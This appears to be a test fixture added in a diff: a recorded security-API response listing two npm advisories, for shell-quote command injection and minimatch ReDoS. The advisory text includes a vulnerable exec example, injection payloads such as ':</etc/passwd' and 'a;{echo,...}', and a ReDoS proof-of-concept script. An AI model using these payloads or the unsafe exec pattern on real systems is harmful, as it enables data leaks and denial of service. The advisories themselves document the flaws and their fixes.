@@ -1,0 +1,62 @@
+{
+    "meta": {
+        "statusCode": 200,
+        "headers": {
+            "cache-control": "no-cache",
+            "content-type": "application/json; charset=utf-8",
+            "date": "Mon, 06 Nov 2017 16:50:01 GMT",
+            "strict-transport-security": "max-age=15768000",
+            "vary": "origin,accept-encoding",
+            "x-content-type-options": "nosniff",
+            "x-download-options": "noopen",
+            "x-frame-options": "DENY",
+            "x-nsp-request-id": "1509987000639:api-4034157750-bbazl:18:j8ytnyek:43291",
+            "x-xss-protection": "1; mode=block",
+            "connection": "close",
+            "transfer-encoding": "chunked"
+        }
+    },
+    "data": [
+        {
+            "id": 117,
+            "updated_at": "2016-06-21T20:07:54.000Z",
+            "created_at": "2016-05-16T17:57:33.000Z",
+            "publish_date": "2016-06-21T17:40:40.000Z",
+            "overview": "The npm module \"shell-quote\" cannot correctly escape \">\" and \"<\" operator used for redirection in shell. I'm wondering if this might be possible vulnerability for many application which depends on shell-quote.\n\nFor example:\n\n   const quote = require('shell-quote').quote;\n   console.log(quote(['foo>bar']));\n\nwill print \"foo>bar\", where \"foo\\>bar\" is desirable.\n\nThis module is downloaded more than 1M times per month and many other modules are depending on this. If an application is escaping command-line args with this module, they might be vulnerable from malicious user input.\n\nFor example:\n```\nvar sq = require('../tests/get/shell-quote-1.6.0');\nvar exec = require('child_process').exec;\n\nvar pattern = process.argv[2];\n\ncommand = sq.quote(['grep', pattern]));\nexec('cat file | ' + command, function ( err, stdout, stderr) {\n    console.log(command, stdout);   \n});\n```\nwill be vulnerable when user input something like pattern = ':</etc/passwd', which causes the content of /etc/passwd to be leaked.\n\nInternally, (Jon Lamendola, Nick Starke, Jacob Waddell) found that the `;`, `{`, and `}` characters weren't escaped properly either. This allows for full command injection. A malicious user could input `'a;{echo,test,123,234}'` to execute echo fully.",
+            "recommendation": "Upgrade to at least version 1.6.1",
+            "cvss_vector": "CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "cvss_score": 8.4,
+            "module": "shell-quote",
+            "version": "1.6.0",
+            "vulnerable_versions": "<=1.6.0",
+            "patched_versions": ">=1.6.1",
+            "title": "Potential Command Injection",
+            "path": [
+                "nsp-reporter-checkstyle@1.0.0",
+                "shell-quote@1.6.0"
+            ],
+            "advisory": "https://nodesecurity.io/advisories/117"
+        },
+        {
+            "id": 118,
+            "updated_at": "2016-08-09T14:16:01.000Z",
+            "created_at": "2016-05-25T16:37:20.000Z",
+            "publish_date": "2016-06-20T15:52:52.000Z",
+            "overview": "Minimatch is a minimal matching utility that works by converting glob expressions into JavaScript `RegExp` objects.  The primary function, `minimatch(path, pattern)` is vulnerable to ReDoS in the `pattern` parameter.  This is because of the regular expression on line 521 of minimatch.js: `/((?:\\\\{2})*)(\\\\?)\\|/g,`.  The problematic portion of the regex is `((?:\\\\{2})*)` which matches against `\\\\`.\n\nA proof of concept is as follows:\n```\nvar minimatch = require(“minimatch”);\n\n// utility function for generating long strings\nvar genstr = function (len, chr) {\n  var result = “”;\n  for (i=0; i<=len; i++) {\n    result = result + chr;\n  }\n  return result;\n}\n\nvar exploit = “[!” + genstr(1000000, “\\\\”) + “A”;\n\n// minimatch exploit.\nconsole.log(“starting minimatch”);\nminimatch(“foo”, exploit);\nconsole.log(“finishing minimatch”);\n```",
+            "recommendation": "Updated to version 3.0.2 or greater",
+            "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "cvss_score": 7.5,
+            "module": "minimatch",
+            "version": "3.0.0",
+            "vulnerable_versions": "<=3.0.1",
+            "patched_versions": ">=3.0.2",
+            "title": "Regular Expression Denial of Service",
+            "path": [
+                "nsp-reporter-checkstyle@1.0.0",
+                "minimatch@3.0.0"
+            ],
+            "advisory": "https://nodesecurity.io/advisories/118"
+        }
+    ],
+    "message": "2 vulnerabilities found"
+}
